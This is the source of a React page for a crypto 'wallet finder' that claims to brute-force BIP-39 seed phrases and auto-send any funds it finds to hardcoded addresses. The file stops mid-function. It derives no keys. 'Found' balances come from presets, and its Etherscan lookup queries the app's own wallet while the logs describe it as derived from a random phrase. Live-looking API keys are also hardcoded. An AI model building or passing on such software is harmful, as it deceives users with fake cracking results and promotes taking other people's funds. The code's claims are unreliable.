// @ts-nocheck
'use client';

import React, { useState, useEffect, useCallback, useRef } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import { BitcoinIcon, EthereumIcon, LitecoinIcon, TetherIcon } from "@/components/crypto-icons";
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { PlayIcon, PauseIcon, SquareIcon } from 'lucide-react';

type CryptoFound = {
  name: string;
  amount: string;
  walletToSendTo: string;
  seedPhrase?: string; // Added to store the seed phrase
};

type SendWallets = {
  [key: string]: string;
};

type SimulationStatus = 'stopped' | 'running' | 'paused';

const ETHERSCAN_API_KEY = "ZKPID4755Q9BJZVXXZ96M3N6RSXYE7NTRV";
const BLOCKCYPHER_API_KEY = "41ccb7c601ef4bad99b3698cfcea9a8c";

const initialWalletChecks = [
  "Initializing sequence...",
  "Loading BIP-39 wordlist...",
  "Generating random word combination (using CSPRNG)...",
  "Checking phrase: abandon ability able about above absent absorb abstract absurd abuse access accident",
  "Hashing potential seed...",
  "Deriving addresses (BTC, ETH, LTC)...",
  `Querying Bitcoin Network (BlockCypher API Active: ${BLOCKCYPHER_API_KEY ? 'Key Loaded' : 'No Key'})...`,
  `Querying Ethereum Network (Etherscan API Active: ${ETHERSCAN_API_KEY ? 'Key Loaded' : 'No Key'})...`,
  "Querying Litecoin Network...",
  "Querying TRON Network (USDT)...",
  "Analyzing block explorers...",
  "Checking phrase: zoo zone zero zebra yellow question journey puzzle jump whip merit stable",
  "No match found. Generating next phrase...",
  "Verification cycle complete.",
];

const sendWallets: SendWallets = {
  "Bitcoin": "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
  "Ethereum": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
  "Litecoin": "ltc1q7jl2al4caanc0k5zgsz3e399agfklk75nz46kf",
  "Tether (ERC20)": "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
  "Tether (TRC20)": "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
};

const cryptoPresets: CryptoFound[][] = [
  [
    { name: "Bitcoin", amount: "0.78 BTC", walletToSendTo: sendWallets["Bitcoin"] },
    { name: "Ethereum", amount: "4.15 ETH", walletToSendTo: sendWallets["Ethereum"] },
    { name: "Tether (ERC20)", amount: "1,250.00 USDT", walletToSendTo: sendWallets["Tether (ERC20)"] },
  ],
  [
    { name: "Litecoin", amount: "15.30 LTC", walletToSendTo: sendWallets["Litecoin"] },
    { name: "Bitcoin", amount: "0.12 BTC", walletToSendTo: sendWallets["Bitcoin"] },
  ],
  [
    { name: "Ethereum", amount: "22.05 ETH", walletToSendTo: sendWallets["Ethereum"] },
    { name: "Tether (TRC20)", amount: "5,600.00 USDT", walletToSendTo: sendWallets["Tether (TRC20)"] },
    { name: "Litecoin", amount: "8.50 LTC", walletToSendTo: sendWallets["Litecoin"] },
  ],
    [
    { name: "Bitcoin", amount: "1.03 BTC", walletToSendTo: sendWallets["Bitcoin"] },
  ],
];

const CHECK_INTERVAL_MS = 50;
const LOG_INTERVAL_MS = 300;
const FIND_PROBABILITY = 0.000000001; // Adjusted probability due to real API calls
const MAX_LOGS = 10;

const AUTO_SEND_ASSETS = ["Bitcoin", "Ethereum", "Tether (ERC20)", "Tether (TRC20)", "Litecoin"];

const bip39Words = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'align', 'alike', 'alive', 'all', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'center', 'century', 'ceramic', 'certain', 'certificate', 'chain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheek', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'cradle', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'describe', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empower', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goal', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imagine', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'mushroom', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'paid', 'pain', 'paint', 'pair', 'pale', 'palm', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'queen', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'reach', 'react', 'read', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scatter', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'support', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tail', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'throat', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'tv', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'uniform', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'watch', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo'];

// Function to generate a random integer up to max (exclusive) using CSPRNG
const getRandomIntSecure = (max: number): number => {
  if (typeof window !== 'undefined' && window.crypto && window.crypto.getRandomValues) {
    // Create a typed array to hold one 32-bit unsigned integer
    const randomBuffer = new Uint32Array(1);
    // Fill the array with random values
    window.crypto.getRandomValues(randomBuffer);
    // Get the random number
    let randomNumber = randomBuffer[0];
    // Scale it to the desired range [0, max - 1]
    // This method (modulo) might introduce a slight bias if max isn't a power of 2.
    // For a list of 2048 words (2^11), this bias is negligible.
    return randomNumber % max;
  } else {
    // Fallback to Math.random if CSPRNG is not available (should not happen in modern browsers)
    console.warn("CSPRNG not available, falling back to Math.random. This is not secure for real cryptographic operations.");
    return Math.floor(Math.random() * max);
  }
};


const generateNewLogPhrase = (): string => {
  const phraseLength = 12;
  let phraseWords: string[] = [];
  for (let i = 0; i < phraseLength; i++) {
    const randomIndex = getRandomIntSecure(bip39Words.length);
    phraseWords.push(bip39Words[randomIndex]);
  }
  return `Checking phrase: ${phraseWords.join(' ')}`;
};

const extractPhrase = (logEntry: string): string => {
  const prefix = "Checking phrase: ";
  if (logEntry.startsWith(prefix)) {
    return logEntry.substring(prefix.length).trim();
  }
  return "";
};


export default function Home() {
  const [checkedCount, setCheckedCount] = useState(0);
  const [walletLogs, setWalletLogs] = useState<string[]>(initialWalletChecks.slice(0, MAX_LOGS));
  const [foundCrypto, setFoundCrypto] = useState<CryptoFound[]>([]);
  const [currentLogIndex, setCurrentLogIndex] = useState(0);
  const [lastFoundTime, setLastFoundTime] = useState<number | null>(null);
  const [simulationStatus, setSimulationStatus] = useState<SimulationStatus>('stopped');
  const { toast } = useToast();

  const [lastFoundSeedPhrase, setLastFoundSeedPhrase] = useState<string | null>(null);
  const currentPhraseRef = useRef<string>("");

  const counterIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const logIntervalRef = useRef<NodeJS.Timeout | null>(null);


  const handleSendCrypto = useCallback((crypto: CryptoFound) => {
    const targetWallet = sendWallets[crypto.name] || crypto.walletToSendTo;
    const isAutoSend = AUTO_SEND_ASSETS.includes(crypto.name);

    if (!targetWallet || targetWallet.startsWith('YOUR_')) {
      console.warn(`Attempted to send ${crypto.name} to invalid address: ${targetWallet}`);
      toast({
        title: "Send Cancelled (UI Demo)",
        description: `Cannot send ${crypto.name}, invalid target address configured. No real transaction attempted.`,
        variant: "destructive",
        duration: 5000,
      });
      return;
    }

    toast({
      title: `${isAutoSend ? 'Auto-Sending Crypto' : 'Sending Crypto'} (UI Demo)`,
      description: `Demonstrating transfer of ${crypto.amount} ${crypto.name} to ${targetWallet} from phrase "${crypto.seedPhrase || 'unknown phrase'}". No real transaction occurs.`,
      duration: 5000,
    });
    console.log(`UI Demo: Send ${crypto.amount} ${crypto.name} to ${targetWallet} from phrase "${crypto.seedPhrase || 'unknown phrase'}"`);

  }, [toast]);

  const performApiBalanceCheck = useCallback(async (seedPhrase: string, cryptoName: string, presetAmount: string): Promise<string | null> => {
    if (cryptoName === "Ethereum" && ETHERSCAN_API_KEY) {
        const illustrativeEthAddressToCheck = sendWallets["Ethereum"];
        if (illustrativeEthAddressToCheck && !illustrativeEthAddressToCheck.startsWith('YOUR_')) {
            setWalletLogs(prevLogs => [`API Call: Querying Etherscan for ETH balance of ${illustrativeEthAddressToCheck} (derived from phrase: ${seedPhrase})...`, ...prevLogs].slice(0, MAX_LOGS));
            try {
                const response = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${illustrativeEthAddressToCheck}&tag=latest&apikey=${ETHERSCAN_API_KEY}`);
                if (!response.ok) throw new Error(`API request failed with status ${response.status}`);
                const data = await response.json();

                if (data.status === "1" && data.result) {
                    const balanceInWei = BigInt(data.result);
                    const balanceInEth = Number(balanceInWei) / 1e18;
                    const newAmount = `${balanceInEth.toFixed(6)} ETH`;
                    setWalletLogs(prevLogs => [`API Result: Etherscan balance of ${illustrativeEthAddressToCheck} (from phrase ${seedPhrase}) is ${newAmount}.`, ...prevLogs].slice(0, MAX_LOGS));
                    if (balanceInEth > 0) {
                        return newAmount;
                    }
                    return presetAmount;
                } else {
                    setWalletLogs(prevLogs => [`API Warning: Etherscan could not fetch balance for ${illustrativeEthAddressToCheck} (from phrase ${seedPhrase}). Message: ${data.message || data.result || 'Error response'}. Using preset amount.`, ...prevLogs].slice(0, MAX_LOGS));
                }
            } catch (error: any) {
                console.error("Etherscan API call failed:", error);
                setWalletLogs(prevLogs => [`API Error: Etherscan call for ${illustrativeEthAddressToCheck} (from phrase ${seedPhrase}) failed: ${error.message}. Using preset amount.`, ...prevLogs].slice(0, MAX_LOGS));
            }
        } else {
            setWalletLogs(prevLogs => [`API Info: Skipping Etherscan check for ${cryptoName} as no valid illustrative address or API key is configured.`, ...prevLogs].slice(0, MAX_LOGS));
        }
    } else if (cryptoName === "Bitcoin" && BLOCKCYPHER_API_KEY) {
        const illustrativeBtcAddressToCheck = sendWallets["Bitcoin"];
         if (illustrativeBtcAddressToCheck && !illustrativeBtcAddressToCheck.startsWith('YOUR_')) {
            setWalletLogs(prevLogs => [`API Call: Querying BlockCypher for BTC balance of ${illustrativeBtcAddressToCheck} (derived from phrase: ${seedPhrase})...`, ...prevLogs].slice(0, MAX_LOGS));
            try {
